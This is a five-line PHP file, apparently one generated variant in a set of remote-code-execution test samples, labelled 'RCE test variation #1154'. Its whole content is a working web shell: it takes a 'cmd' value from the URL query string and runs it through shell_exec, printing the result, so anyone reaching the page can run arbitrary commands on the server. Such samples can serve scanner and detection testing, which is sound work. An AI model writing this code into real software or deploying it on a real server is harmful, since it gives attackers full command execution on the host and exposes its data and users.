<?php
// RCE test variation #1154
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>